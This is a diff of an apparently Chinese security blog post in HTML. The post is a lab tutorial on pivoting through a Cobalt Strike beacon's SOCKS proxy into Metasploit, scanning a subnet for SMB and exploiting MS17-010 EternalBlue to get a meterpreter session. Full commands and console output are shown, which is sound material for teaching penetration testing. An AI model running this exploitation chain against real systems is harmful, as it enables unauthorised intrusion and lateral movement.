@@ -467,14 +467,13 @@
 <h1 id="0x03-Metasploit-连接到-Socks-代理服务"><a href="#0x03-Metasploit-连接到-Socks-代理服务" class="headerlink" title="0x03 Metasploit 连接到 Socks 代理服务"></a>0x03 Metasploit 连接到 Socks 代理服务</h1><ul>
 <li>CS 中创建好代理后，在 Metasploit 中可以运行以下命令通过 beacon 的 Socks 代理进行通信</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:127.0.0.1:[port]</span><br><span class="line">setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure>
-
+<pre><code>setg Proxies socks4:127.0.0.1:[port]
+setg ReverseAllowProxy true</code></pre>
 <p>如果感觉上面命令比较长，还可以在 <code>Proxy Pivots</code> 界面中点击 <code>Tunnel</code> 按钮查看命令。</p>
 <ul>
 <li>运行以下命令来停止</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsetg Proxies</span><br></pre></td></tr></table></figure>
-
+<pre><code>unsetg Proxies</code></pre>
 <p>setg 命令和 unsetg 表示在 metasploit 中全局有效，不用在每次选择模块后再重新设置。</p>
 <h1 id="0x04-演示"><a href="#0x04-演示" class="headerlink" title="0x04 演示"></a>0x04 演示</h1><h2 id="1、环境说明"><a href="#1、环境说明" class="headerlink" title="1、环境说明"></a>1、环境说明</h2><blockquote>
 <p>攻击机 IP：192.168.175.200</p>
@@ -484,31 +483,102 @@
 <p>当前已经上线了一个 IP 为 192.168.175.130 主机，通过 ipconfig 发现，该主机也在 192.168.232.0/24 地址段内。</p>
 <p>但当前攻击机无法访问 232 的地址段，因此如果想对 232 段内的主机发起攻击，就可以采用将 192.168.175.130 作为跳板机访问的方式。</p>
 <h2 id="2、设置-socks-代理"><a href="#2、设置-socks-代理" class="headerlink" title="2、设置 socks 代理"></a>2、设置 socks 代理</h2><p>开启交互模式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 0</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">sleep</span> <span class="number">0</span></span><br><span class="line">[*] Tasked beacon to become interactive</span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br></pre></td></tr></table></figure>
-
+<pre><code>sleep 0</code></pre>
+<pre><code class="powershell">beacon&gt; sleep 0
+[*] Tasked beacon to become interactive
+[+] host called home, sent: 16 bytes</code></pre>
 <p>开启 socks 代理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks 9527</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; socks <span class="number">9527</span></span><br><span class="line">[+] started SOCKS4a server on: <span class="number">9527</span></span><br><span class="line">[+] host called home, sent: <span class="number">16</span> bytes</span><br></pre></td></tr></table></figure>
-
+<pre><code>socks 9527</code></pre>
+<pre><code class="powershell">beacon&gt; socks 9527
+[+] started SOCKS4a server on: 9527
+[+] host called home, sent: 16 bytes</code></pre>
 <p>以上操作也可以通过图形化的方式进行。</p>
 <h2 id="3、Metasploit-中进行设置"><a href="#3、Metasploit-中进行设置" class="headerlink" title="3、Metasploit 中进行设置"></a>3、Metasploit 中进行设置</h2><p>开启 Metasploit 后，运行 setg 命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:192.168.175.200:9527</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4:<span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span></span><br><span class="line">Proxies =&gt; socks4:<span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span></span><br></pre></td></tr></table></figure>
-
+<pre><code>setg Proxies socks4:192.168.175.200:9527</code></pre>
+<pre><code class="powershell">msf5 &gt; setg Proxies socks4:192.168.175.200:9527
+Proxies =&gt; socks4:192.168.175.200:9527</code></pre>
 <h2 id="4、扫描-192-168-232-0-24-地址段中的-445-端口"><a href="#4、扫描-192-168-232-0-24-地址段中的-445-端口" class="headerlink" title="4、扫描 192.168.232.0/24 地址段中的 445 端口"></a>4、扫描 192.168.232.0/24 地址段中的 445 端口</h2><p>这里作为演示，只扫描一下 445 端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhost 192.168.232.0&#x2F;24</span><br><span class="line">set threads 64</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<pre><code>use auxiliary/scanner/smb/smb_version
+set rhost 192.168.232.0/24
+set threads 64
+exploit</code></pre>
+<pre><code class="powershell">msf5 &gt; use auxiliary/scanner/smb/smb_version 
 
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_version </span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> rhost <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span> </span><br><span class="line">rhost =&gt; <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> threads <span class="number">64</span></span><br><span class="line">threads =&gt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_version) &gt; exploit </span><br><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned  <span class="number">44</span> of <span class="number">256</span> hosts (<span class="number">17</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned  <span class="number">64</span> of <span class="number">256</span> hosts (<span class="number">25</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">110</span> of <span class="number">256</span> hosts (<span class="number">42</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">111</span> of <span class="number">256</span> hosts (<span class="number">43</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">128</span> of <span class="number">256</span> hosts (<span class="number">50</span>% complete)</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.133</span>:<span class="number">445</span>   - Host is running Windows <span class="number">7</span> Ultimate SP1 (build:<span class="number">7601</span>) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Host is running Windows <span class="number">2008</span> HPC SP1 (build:<span class="number">7601</span>) (name:WINDC) (domain:TEAMSSIX) (signatures:required)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">165</span> of <span class="number">256</span> hosts (<span class="number">64</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">184</span> of <span class="number">256</span> hosts (<span class="number">71</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">220</span> of <span class="number">256</span> hosts (<span class="number">85</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">249</span> of <span class="number">256</span> hosts (<span class="number">97</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.0</span>/<span class="number">24</span>:<span class="number">445</span>  - Scanned <span class="number">256</span> of <span class="number">256</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+msf5 auxiliary(scanner/smb/smb_version) &gt; set rhost 192.168.232.0/24 
+rhost =&gt; 192.168.232.0/24
 
+msf5 auxiliary(scanner/smb/smb_version) &gt; set threads 64
+threads =&gt; 64
+
+msf5 auxiliary(scanner/smb/smb_version) &gt; exploit 
+use auxiliary/scanner/smb/smb_version
+[*] 192.168.232.0/24:445  - Scanned  44 of 256 hosts (17% complete)
+[*] 192.168.232.0/24:445  - Scanned  64 of 256 hosts (25% complete)
+[*] 192.168.232.0/24:445  - Scanned 110 of 256 hosts (42% complete)
+[*] 192.168.232.0/24:445  - Scanned 111 of 256 hosts (43% complete)
+[*] 192.168.232.0/24:445  - Scanned 128 of 256 hosts (50% complete)
+[+] 192.168.232.133:445   - Host is running Windows 7 Ultimate SP1 (build:7601) (name:WINTEST) (domain:TEAMSSIX) (signatures:optional)
+[+] 192.168.232.132:445   - Host is running Windows 2008 HPC SP1 (build:7601) (name:WINDC) (domain:TEAMSSIX) (signatures:required)
+[*] 192.168.232.0/24:445  - Scanned 165 of 256 hosts (64% complete)
+[*] 192.168.232.0/24:445  - Scanned 184 of 256 hosts (71% complete)
+[*] 192.168.232.0/24:445  - Scanned 220 of 256 hosts (85% complete)
+[*] 192.168.232.0/24:445  - Scanned 249 of 256 hosts (97% complete)
+[*] 192.168.232.0/24:445  - Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre>
 <h2 id="5、发现利用"><a href="#5、发现利用" class="headerlink" title="5、发现利用"></a>5、发现利用</h2><p>通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.232.132</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+set rhosts 192.168.232.132
+set payload windows/x64/meterpreter/bind_tcp
+exploit</code></pre>
+<pre><code class="powershell">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
 
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">rhosts =&gt; <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="keyword">Using</span> auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Host is likely VULNERABLE to MS17<span class="literal">-010</span>! - Windows Server <span class="number">2008</span> HPC Edition <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span><span class="literal">-bit</span>)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span>   - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Connecting to target <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Connection established <span class="keyword">for</span> exploitation.</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Target OS selected valid <span class="keyword">for</span> OS indicated by SMB reply</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - CORE raw buffer dump (<span class="number">51</span> bytes)</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000000  <span class="number">57</span> <span class="number">69</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">6</span>f <span class="number">77</span> <span class="number">73</span> <span class="number">20</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">65</span> <span class="number">72</span> <span class="number">20</span> <span class="number">32</span>  Windows Server <span class="number">2</span></span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000010  <span class="number">30</span> <span class="number">30</span> <span class="number">38</span> <span class="number">20</span> <span class="number">48</span> <span class="number">50</span> <span class="number">43</span> <span class="number">20</span> <span class="number">45</span> <span class="number">64</span> <span class="number">69</span> <span class="number">74</span> <span class="number">69</span> <span class="number">6</span>f <span class="number">6</span>e <span class="number">20</span>  <span class="number">008</span> HPC Edition </span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000020  <span class="number">37</span> <span class="number">36</span> <span class="number">30</span> <span class="number">31</span> <span class="number">20</span> <span class="number">53</span> <span class="number">65</span> <span class="number">72</span> <span class="number">76</span> <span class="number">69</span> <span class="number">63</span> <span class="number">65</span> <span class="number">20</span> <span class="number">50</span> <span class="number">61</span> <span class="number">63</span>  <span class="number">7601</span> Service Pac</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - <span class="number">0</span>x00000030  <span class="number">6</span>b <span class="number">20</span> <span class="number">31</span>                                         k <span class="number">1</span>             </span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Target arch selected valid <span class="keyword">for</span> arch indicated by DCE/RPC reply</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Trying exploit with <span class="number">12</span> Groom Allocations.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending all but last fragment of exploit packet</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Starting non<span class="literal">-paged</span> pool grooming</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending SMBv2 buffers</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending final SMBv2 buffers.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending last fragment of exploit packet!</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Receiving response from exploit packet</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="number">0</span>xC000000D)!</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Sending egg to corrupted connection.</span><br><span class="line">[*] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - Triggering free of corrupted buffer.</span><br><span class="line">[*] Started bind TCP handler against <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">4444</span></span><br><span class="line">[*] Sending stage (<span class="number">201283</span> bytes) to <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span> -&gt; <span class="number">192.168</span>.<span class="number">175.200</span>:<span class="number">9527</span>) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-01</span> <span class="number">22</span>:<span class="number">13</span>:<span class="number">57</span> <span class="literal">-0400</span></span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=<span class="literal">-WIN</span>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] <span class="number">192.168</span>.<span class="number">232.132</span>:<span class="number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">Interface <span class="number">11</span></span><br><span class="line">============</span><br><span class="line">Name         : Intel(<span class="built_in">R</span>) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">Hardware MAC : <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:d3:<span class="number">6</span>c:<span class="number">3</span>d</span><br><span class="line">MTU          : <span class="number">1500</span></span><br><span class="line">IPv4 Address : <span class="number">192.168</span>.<span class="number">232.132</span></span><br><span class="line">IPv4 Netmask : <span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line">IPv6 Address : fe80::a1<span class="built_in">ac</span>:<span class="number">3035</span>:cbdf:<span class="number">4872</span></span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></pre></td></tr></table></figure>
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.232.132
+rhosts =&gt; 192.168.232.132
 
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/bind_tcp
+payload =&gt; windows/x64/meterpreter/bind_tcp
+
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit 
+[*] 192.168.232.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.232.132:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.232.132:445   - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.232.132:445 - Connecting to target for exploitation.
+[+] 192.168.232.132:445 - Connection established for exploitation.
+[+] 192.168.232.132:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.232.132:445 - CORE raw buffer dump (51 bytes)
+[*] 192.168.232.132:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.232.132:445 - 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition 
+[*] 192.168.232.132:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[*] 192.168.232.132:445 - 0x00000030  6b 20 31                                         k 1             
+[+] 192.168.232.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.232.132:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.232.132:445 - Sending all but last fragment of exploit packet
+[*] 192.168.232.132:445 - Starting non-paged pool grooming
+[+] 192.168.232.132:445 - Sending SMBv2 buffers
+[+] 192.168.232.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.232.132:445 - Sending final SMBv2 buffers.
+[*] 192.168.232.132:445 - Sending last fragment of exploit packet!
+[*] 192.168.232.132:445 - Receiving response from exploit packet
+[+] 192.168.232.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.232.132:445 - Sending egg to corrupted connection.
+[*] 192.168.232.132:445 - Triggering free of corrupted buffer.
+[*] Started bind TCP handler against 192.168.232.132:4444
+[*] Sending stage (201283 bytes) to 192.168.232.132
+[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 192.168.175.200:9527) at 2020-09-01 22:13:57 -0400
+[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.232.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter &gt; ipconfig
+Interface 11
+============
+Name         : Intel(R) PRO/1000 MT Network Connection
+Hardware MAC : 00:0c:29:d3:6c:3d
+MTU          : 1500
+IPv4 Address : 192.168.232.132
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::a1ac:3035:cbdf:4872
+IPv6 Netmask : ffff:ffff:ffff:ffff::</code></pre>
 <blockquote>
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
@@ -949,7 +1019,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
